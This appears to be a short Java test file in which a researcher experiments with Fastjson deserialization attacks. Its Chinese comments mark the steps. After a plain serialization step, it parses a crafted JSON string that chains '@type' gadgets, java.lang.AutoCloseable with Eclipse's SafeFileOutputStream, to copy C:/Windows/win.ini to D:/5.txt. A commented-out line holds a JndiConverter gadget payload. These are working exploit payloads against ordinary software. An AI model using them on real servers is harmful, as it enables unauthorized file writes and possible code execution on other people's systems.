package com.firebasky.user;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;


public class fastjsontest {
    public static void main(String[] args) throws Exception {
        person person = new person();
        System.out.println("-------------------------------序列化--------------------------------------------------");

        String str = JSONObject.toJSONString(person,SerializerFeature.WriteClassName);
        System.out.println(str);

//        String str1 = JSONObject.toJSONString(person, SerializerFeature.WriteClassName);
//        System.out.println(str1);

        //System.out.println("-------------------------------反序列化的parseObject方法--------------------------------------------------");
        //String string ="[\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"\"]";
        //Object object = JSONObject.parseObject(string);//set get都调用

//  Feature.SupportNonPublicField 只能影响1.2.22-1.2.24  可以反序列化属性为private
        System.out.println("-------------------------------反序列化的parse方法--------------------------------------------------");
        String test ="{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"D:/5.txt\"}";
        Object str3 = JSONObject.parse(test);//调用set方法

    }
}